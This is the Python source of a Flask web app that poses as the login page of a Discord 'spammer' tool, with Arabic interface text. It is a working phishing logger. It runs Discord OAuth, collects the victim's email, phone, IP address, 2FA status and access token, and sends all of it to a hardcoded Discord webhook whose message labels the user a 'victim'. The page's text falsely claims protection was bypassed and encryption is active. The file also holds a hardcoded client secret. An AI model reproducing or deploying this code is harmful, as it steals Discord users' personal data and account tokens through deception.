import os
import requests
from flask import Flask, request, redirect, render_template_string

app = Flask(__name__)

# --- بياناتك الأساسية ---
WEBHOOK_URL = 'https://discord.com/api/webhooks/1496277399183036467/3Hkd3MSaHRQrbS24feIeogq1sDB6WygdO_yrLTZUBq-VA0npl5ISb3je6HIErbU1KFbR'
CLIENT_ID = '1496270267880574997'
CLIENT_SECRET = 'BuGd4gBYasz0WMD4DPOW98xqA21YXQwG'
REDIRECT_URI = 'https://ez-ye-bot.vercel.app/callback'
SPAM_PROJECT_URL = 'https://discord.com/application-directory/1043321520111124480'

# واجهة احترافية بستايل "الهكر"
HTML_PAGE = '''
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>EzYe Cloud Spammer | Login</title>
    <style>
        body { background-color: #0a0a0a; color: #00ff41; font-family: 'Consolas', monospace; text-align: center; padding-top: 100px; }
        .container { border: 1px solid #00ff41; display: inline-block; padding: 50px; background: rgba(0, 255, 65, 0.05); border-radius: 10px; }
        .btn { background-color: #00ff41; color: black; padding: 15px 40px; text-decoration: none; border-radius: 5px; font-weight: bold; font-size: 1.2em; display: inline-block; transition: 0.3s; }
        .btn:hover { box-shadow: 0 0 20px #00ff41; cursor: pointer; }
        .info { color: #888; font-size: 0.8em; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>[ EZYE EXTERNAL SPAMMER V4 ]</h1>
        <p>جاري فحص الحماية... تم التخطي ✅</p>
        <p>يرجى ربط حسابك للوصول للوحة التحكم</p>
        <br>
        <a href="https://discord.com/api/oauth2/authorize?client_id={{client_id}}&redirect_uri={{redirect_uri}}&response_type=code&scope=identify%20email" class="btn">LOGIN WITH DISCORD</a>
        <div class="info">نظام التشفير العسكري مفعل تلقائياً 🛡️</div>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML_PAGE, client_id=CLIENT_ID, redirect_uri=REDIRECT_URI)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code: return "Auth Error", 400
    
    data = {
        'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code', 'code': code, 'redirect_uri': REDIRECT_URI
    }
    r = requests.post('https://discord.com/api/v10/oauth2/token', data=data)
    res = r.json()
    access_token = res.get('access_token')
    
    if access_token:
        # جلب البيانات الكاملة
        user = requests.get('https://discord.com/api/users/@me', headers={'Authorization': f'Bearer {access_token}'}).json()
        user_ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
        
        # تحليل البيانات الإضافية
        nitro_type = {0: "لا يوجد", 1: "Nitro Classic", 2: "Nitro Boost", 3: "Nitro Basic"}.get(user.get('premium_type', 0))
        mfa = "✅ مفعل" if user.get('mfa_enabled') else "❌ غير مفعل"
        verified = "✅ موثق" if user.get('verified') else "❌ غير موثق"
        locale = user.get('locale', 'Unknown') # لغة الجهاز
        
        # إرسال التقرير النهائي للويب هوك
        payload = {
            "content": "🚨 **صيد كامل من الإصدار الرابع!** 🚨",
            "embeds": [{
                "title": f"👤 ملف الضحية: {user.get('username')}",
                "color": 65280,
                "fields": [
                    {"name": "🆔 الآيدي", "value": f"`{user.get('id')}`", "inline": True},
                    {"name": "🌍 اللغة", "value": f"`{locale}`", "inline": True},
                    {"name": "📧 الإيميل", "value": f"`{user.get('email', 'N/A')}`", "inline": False},
                    {"name": "📱 الهاتف", "value": f"`{user.get('phone', 'غير مربوط')}`", "inline": True},
                    {"name": "💎 النيترو", "value": f"**{nitro_type}**", "inline": True},
                    {"name": "🛡️ 2FA", "value": mfa, "inline": True},
                    {"name": "✅ التوثيق", "value": verified, "inline": True},
                    {"name": "🌐 IP", "value": f"||{user_ip}||", "inline": False},
                    {"name": "🔑 التوكن", "value": f"``` {access_token} ```"}
                ],
                "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{user.get('id')}/{user.get('avatar')}.png"},
                "footer": {"text": "EzYe Logger Ultimate V4"}
            }]
        }
        requests.post(WEBHOOK_URL, json=payload)
        return redirect(SPAM_PROJECT_URL)
        
    return "Failed", 400
